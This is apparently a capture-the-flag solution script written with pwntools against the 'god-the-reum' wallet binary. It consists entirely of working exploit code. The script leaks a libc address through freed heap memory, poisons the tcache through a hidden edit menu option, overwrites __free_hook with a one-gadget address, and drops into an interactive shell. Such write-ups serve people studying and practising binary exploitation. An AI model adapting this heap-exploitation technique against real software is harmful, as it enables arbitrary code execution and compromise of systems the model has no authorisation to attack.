from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

name = "./god-the-reum"
bin = ELF(name)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc-2.27.so")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-2.27.so")}

conn = process(name, env=env)
#gdb.attach(conn)

def menu(ch, idx = None):
  conn.recvuntil("select your choice : ")
  conn.sendline(str(ch))
  if idx is not None:
    conn.recvuntil("input wallet no :")
    conn.sendline(str(idx))

def create(size):
  menu(1)
  conn.recvuntil("how much initial eth")
  conn.sendline(str(size))
  conn.recvuntil("Creating new wallet")

def deposit(idx, money):
  menu(2, idx)
  conn.recvuntil("how much deposit")
  conn.sendline(str(money))

def withdraw(idx, money):
  menu(3, idx)
  conn.recvuntil("how much")
  conn.sendline(str(money))

def show():
  menu(4)

def hid(idx, contents):
  menu(6, idx)
  conn.recvuntil("new eth :")
  conn.send(contents)

# Leaking libc
create(0x3000) # 0
create(0x30) # 1
withdraw(0, 0x3000)
show()
conn.recvuntil("0) addr")
conn.recvuntil("ballance ")
libc_leak = int(conn.recvline()[:-1])
libc.address = libc_leak - 0x7f072a20bca0 + 0x7f0729e20000

withdraw(1, 0x30)
hid(1, p64(libc.symbols['__free_hook']) + "\n")

create(0x30) # 2
create(0x30) # 3
hid(3, p64(libc.address + 0x4f322) + "\n")
#create(0x30) # 4
withdraw(2, 0x30)

log.info("Libc leak: " + hex(libc_leak))

conn.interactive()
